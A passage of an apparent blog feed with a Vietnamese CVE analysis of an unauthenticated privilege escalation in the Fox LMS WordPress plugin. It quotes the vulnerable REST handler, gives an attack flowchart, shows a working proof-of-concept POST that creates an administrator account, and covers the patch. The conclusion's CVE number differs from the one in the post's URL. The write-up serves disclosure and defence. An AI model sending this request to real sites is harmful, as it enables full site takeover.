width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Fox LMS&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.0.5.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.0.5.3&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition note open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;M·∫∑c d√π th√¥ng tin c√¥ng b·ªë cho bi·∫øt l·ªó h·ªïng ƒë√£ ƒë∆∞·ª£c v√° trong phi√™n b·∫£n &lt;strong&gt;&lt;code&gt;1.0.5.2&lt;/code&gt;&lt;/strong&gt;, nh∆∞ng tr√™n th·ª±c t·∫ø b·∫£n v√° ch·ªâ ƒë∆∞·ª£c √°p d·ª•ng ƒë·∫ßy ƒë·ªß t·ª´ phi√™n b·∫£n &lt;strong&gt;&lt;code&gt;1.0.5.3&lt;/code&gt;&lt;/strong&gt;.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt REST API nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    self::getNamespace(), // fox-lms/v1&#xA;    $this-&amp;gt;getRoute(&amp;#39;create-order&amp;#39;), // payments/create-order&#xA;    [&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE, // POST&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; [$this, &amp;#39;createOrder&amp;#39;],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; &amp;#39;__return_true&amp;#39;,&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi c·∫•u h√¨nh n√†y, endpoint ƒë∆∞·ª£c public t·∫°i ƒë·ªãa ch·ªâ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/fox-lms/v1/payments/create-order&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi c√≥ m·ªôt request g·ª≠i ƒë·∫øn endpoint tr√™n b·∫±ng ph∆∞∆°ng th·ª©c POST, WordPress s·∫Ω t·ª± ƒë·ªông g·ªçi h√†m &lt;code&gt;createOrder()&lt;/code&gt;. Do thi·∫øt l·∫≠p &lt;code&gt;&#39;permission_callback&#39; =&amp;gt; &#39;__return_true&#39;&lt;/code&gt;, n√™n endpoint n√†y kh√¥ng y√™u c·∫ßu ki·ªÉm tra quy·ªÅn truy c·∫≠p. ƒêi·ªÅu ƒë√≥ ƒë·ªìng nghƒ©a v·ªõi vi·ªác &lt;strong&gt;b·∫•t k·ª≥ ng∆∞·ªùi d√πng n√†o, k·ªÉ c·∫£ ng∆∞·ªùi ch∆∞a ƒëƒÉng nh·∫≠p, ƒë·ªÅu c√≥ th·ªÉ truy c·∫≠p v√† th·ª±c thi API n√†y m√† kh√¥ng g·∫∑p b·∫•t k·ª≥ r√†o c·∫£n ph√¢n quy·ªÅn n√†o&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function createOrder(WP_REST_Request $request): WP_REST_Response&#xA;{&#xA;    $defaults = [&#xA;        &amp;#39;courseId&amp;#39;   =&amp;gt; 0,&#xA;        &amp;#39;role&amp;#39;       =&amp;gt; &amp;#39;subscriber&amp;#39;,&#xA;        ...&#xA;    ];&#xA;    ...&#xA;    $params = wp_parse_args($request-&amp;gt;get_params(), $defaults);&#xA;&#xA;    if (absint($params[&amp;#39;courseId&amp;#39;]) &amp;lt;= 0) {&#xA;        return (new Response() )-&amp;gt;respond(&#xA;            [&#xA;                &amp;#39;message&amp;#39; =&amp;gt; Fox_Lms_Checkout_Public::getPaymentError(&#xA;                    $this-&amp;gt;errorTitle,&#xA;                    __(&amp;#39;Course not found&amp;#39;, &amp;#39;fox-lms&amp;#39;)&#xA;                ),&#xA;            ],&#xA;            404&#xA;        );&#xA;    }&#xA;    $username = sanitize_user($params[&amp;#39;username&amp;#39;]);&#xA;    $email    = sanitize_email($params[&amp;#39;email&amp;#39;]);&#xA;    ...&#xA;    try {&#xA;        $currency = Payment::instance()-&amp;gt;getCurrencyCode();&#xA;&#xA;        $course         = get_post($params[&amp;#39;courseId&amp;#39;]);&#xA;        $course_info = Fox_Lms_Data::get_course_by_post_id( $params[&amp;#39;courseId&amp;#39;]);&#xA;            &#xA;        $settings = Fox_Lms_Data::get_course_validated_data_from_array( $course_info,[]);&#xA;        $price = Fox_Lms_Data::fox_lms_get_course_price($settings);&#xA;    &#xA;        $courseSettings = [&#xA;            &amp;#39;priceType&amp;#39;  =&amp;gt; ! empty($settings[&amp;#39;fox_lms_payment_type&amp;#39;]) ? $settings[&amp;#39;fox_lms_payment_type&amp;#39;] : &amp;#39;free&amp;#39;,&#xA;            &amp;#39;price&amp;#39; =&amp;gt; $price,&#xA;        ];&#xA;        // $courseSettings = SettingsManager::get($course-&amp;gt;ID);&#xA;        $price          = floatval($courseSettings[&amp;#39;price&amp;#39;]);&#xA;        ...&#xA;&#xA;        // If price is zero or less, treat as free order: create completed order and enroll user immediately.&#xA;        if ($price &amp;lt;= 0) {&#xA;            global $wpdb;&#xA;&#xA;            $userId = 0;&#xA;            if (is_user_logged_in()) {&#xA;                $userId = get_current_user_id();&#xA;            } else {&#xA;                $userData = array(&#xA;                    &amp;#39;first_name&amp;#39; =&amp;gt; sanitize_text_field($params[&amp;#39;first_name&amp;#39;]),&#xA;                    &amp;#39;last_name&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;last_name&amp;#39;]),&#xA;                    &amp;#39;user_login&amp;#39; =&amp;gt; sanitize_user($params[&amp;#39;username&amp;#39;]),&#xA;                    &amp;#39;user_email&amp;#39; =&amp;gt; sanitize_email($params[&amp;#39;email&amp;#39;]),&#xA;                    &amp;#39;user_pass&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;password&amp;#39;]),&#xA;                    &amp;#39;role&amp;#39;       =&amp;gt; sanitize_text_field($params[&amp;#39;role&amp;#39;]),&#xA;                );&#xA;&#xA;                $userId = wp_insert_user($userData);&#xA;                ...&#xA;            }&#xA;        }&#xA;        ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;createOrder()&lt;/code&gt; nh·∫≠n d·ªØ li·ªáu t·ª´ request v√† g√°n gi√° tr·ªã m·∫∑c ƒë·ªãnh, trong ƒë√≥ &lt;strong&gt;&lt;code&gt;role&lt;/code&gt; m·∫∑c ƒë·ªãnh l√† &lt;code&gt;subscriber&lt;/code&gt;&lt;/strong&gt;. Tuy nhi√™n, to√†n b·ªô tham s·ªë t·ª´ ph√≠a ng∆∞·ªùi d√πng g·ª≠i l√™n ƒë∆∞·ª£c tr·ªôn tr·ª±c ti·∫øp v√†o &lt;code&gt;$params&lt;/code&gt; th√¥ng qua &lt;code&gt;wp_parse_args()&lt;/code&gt; m√† &lt;strong&gt;kh√¥ng c√≥ b∆∞·ªõc ki·ªÉm tra hay gi·ªõi h·∫°n gi√° tr·ªã h·ª£p l·ªá cho &lt;code&gt;role&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Khi kh√≥a h·ªçc c√≥ gi√° &lt;strong&gt;b·∫±ng 0 ho·∫∑c mi·ªÖn ph√≠&lt;/strong&gt;, h·ªá th·ªëng s·∫Ω t·ª± ƒë·ªông t·∫°o t√†i kho·∫£n ng∆∞·ªùi d√πng m·ªõi n·∫øu ng∆∞·ªùi g·ªçi API ch∆∞a ƒëƒÉng nh·∫≠p. D·ªØ li·ªáu ng∆∞·ªùi d√πng ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request, bao g·ªìm:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;role&amp;#39; =&amp;gt; sanitize_text_field($params[&amp;#39;role&amp;#39;]),&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† k·∫ª t·∫•n c√¥ng ch·ªâ c·∫ßn g·ª≠i m·ªôt request POST t·ªõi endpoint &lt;code&gt;/wp-json/fox-lms/v1/payments/create-order&lt;/code&gt; v√† truy·ªÅn v√†o gi√° tr·ªã &lt;code&gt;role&lt;/code&gt; t√πy √Ω (v√≠ d·ª•: &lt;code&gt;administrator&lt;/code&gt;). V√¨ endpoint n√†y &lt;strong&gt;kh√¥ng ki·ªÉm tra quy·ªÅn truy c·∫≠p&lt;/strong&gt; v√† h√†m c≈©ng &lt;strong&gt;kh√¥ng validate gi√° tr·ªã role&lt;/strong&gt;, t√†i kho·∫£n m·ªõi s·∫Ω ƒë∆∞·ª£c t·∫°o v·ªõi quy·ªÅn t∆∞∆°ng ·ª©ng.&lt;/p&gt;&#xA;&lt;p&gt;K·∫øt qu·∫£ l√† k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p v·∫´n c√≥ th·ªÉ &lt;strong&gt;t·∫°o t√†i kho·∫£n v·ªõi quy·ªÅn qu·∫£n tr·ªã&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;leo thang ƒë·∫∑c quy·ªÅn v√† chi·∫øm quy·ªÅn ki·ªÉm so√°t to√†n b·ªô website&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;strong&gt;&lt;code&gt;v1.0.5.3&lt;/code&gt;&lt;/strong&gt; ƒë√£ kh·∫Øc ph·ª•c l·ªó h·ªïng b·∫±ng c√°ch &lt;strong&gt;hardcode gi√° tr·ªã &lt;code&gt;role&lt;/code&gt; th√†nh &lt;code&gt;subscriber&lt;/code&gt;&lt;/strong&gt; khi t·∫°o t√†i kho·∫£n ng∆∞·ªùi d√πng m·ªõi, thay v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ d·ªØ li·ªáu request. ƒêi·ªÅu n√†y gi√∫p ngƒÉn ch·∫∑n vi·ªác k·∫ª t·∫•n c√¥ng truy·ªÅn v√†o c√°c gi√° tr·ªã role t√πy √Ω ƒë·ªÉ leo thang ƒë·∫∑c quy·ªÅn.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$userData = array(&#xA;    &amp;#39;first_name&amp;#39; =&amp;gt; sanitize_text_field($params[&amp;#39;first_name&amp;#39;]),&#xA;    &amp;#39;last_name&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;last_name&amp;#39;]),&#xA;    &amp;#39;user_login&amp;#39; =&amp;gt; sanitize_user($params[&amp;#39;username&amp;#39;]),&#xA;    &amp;#39;user_email&amp;#39; =&amp;gt; sanitize_email($params[&amp;#39;email&amp;#39;]),&#xA;    &amp;#39;user_pass&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;password&amp;#39;]),&#xA;    &amp;#39;role&amp;#39;       =&amp;gt; &amp;#39;subscriber&amp;#39;,&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-json/fox-lms/v1/payments/create-order&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Endpoint is publicly accessible (permission_callback = __return_true)&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;createOrder() receives request parameters&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;wp_parse_args() merges user input into params (role is not validated)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Attacker sets role=administrator in request&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Course price is free (price &amp;lt;= 0)&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;User is not logged in ‚Üí system creates new user&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;wp_insert_user() is called with attacker-controlled role&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;New user account is created with Administrator role&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker logs in with newly created account&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Full administrative privileges obtained&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;G·ª≠i request t·∫°o user:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/fox-lms/v1/payments/create-order HTTP/1.1&#xA;Host: localhost&#xA;&#xA;role=administrator&amp;amp;first_name=hacker&amp;amp;last_name=hacker&amp;amp;username=hacker&amp;amp;email=hacker@gmail.com&amp;amp;courseId=course_id&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-08-cve-2025-14156/result.png&#34; title=&#34;Th√†nh c√¥ng t·∫°o user v·ªõi role=administrator&#34; data-thumbnail=&#34;/posts/2026-01-08-cve-2025-14156/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Th√†nh c√¥ng t·∫°o user v·ªõi role=administrator&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-08-cve-2025-14156/result.png&#39; alt=&#34;Result&#34; height=&#34;530&#34; width=&#34;1555&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Th√†nh c√¥ng t·∫°o user v·ªõi role=administrator&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Login v·ªõi user v·ª´a t·∫°o.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-2563&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;REST API ƒë∆∞·ª£c public kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p&lt;/strong&gt; v√† &lt;strong&gt;tham s·ªë &lt;code&gt;role&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c validate&lt;/strong&gt;, cho ph√©p attacker ch∆∞a x√°c th·ª±c t·∫°o t√†i kho·∫£n v·ªõi quy·ªÅn t√πy √Ω, bao g·ªìm &lt;strong&gt;Administrator&lt;/strong&gt;. M·∫∑c d√π c√¥ng b·ªë cho r·∫±ng ƒë√£ v√° ·ªü &lt;code&gt;1.0.5.2&lt;/code&gt;, nh∆∞ng th·ª±c t·∫ø b·∫£n v√° ch·ªâ ho√†n ch·ªânh t·ª´ &lt;strong&gt;&lt;code&gt;1.0.5.3&lt;/code&gt;&lt;/strong&gt; khi &lt;code&gt;role&lt;/code&gt; ƒë∆∞·ª£c hardcode v·ªÅ &lt;code&gt;subscriber&lt;/code&gt;. Ng∆∞·ªùi d√πng c·∫ßn c·∫≠p nh·∫≠t plugin v√† r√† so√°t l·∫°i c√°c t√†i kho·∫£n ƒë√£ t·ªìn t·∫°i.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng expose API nh·∫°y c·∫£m khi ch∆∞a ki·ªÉm so√°t quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng tin t∆∞·ªüng d·ªØ li·ªáu t·ª´ client, ƒë·∫∑c bi·ªát l√† tham s·ªë ph√¢n quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n validate v√† whitelist input.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra th·ª±c t·∫ø b·∫£n v√°, kh√¥ng ch·ªâ d·ª±a v√†o th√¥ng b√°o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/fox-lms/vulnerability/wordpress-fox-lms-plugin-1-0-4-7-1-0-5-1-unauthenticated-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Fox LMS Plugin 1.0.4.7-1.0.5.1 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2563 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-07-cve-2025-2563/</link>
      <pubDate>Wed, 07 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-07-cve-2025-2563/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 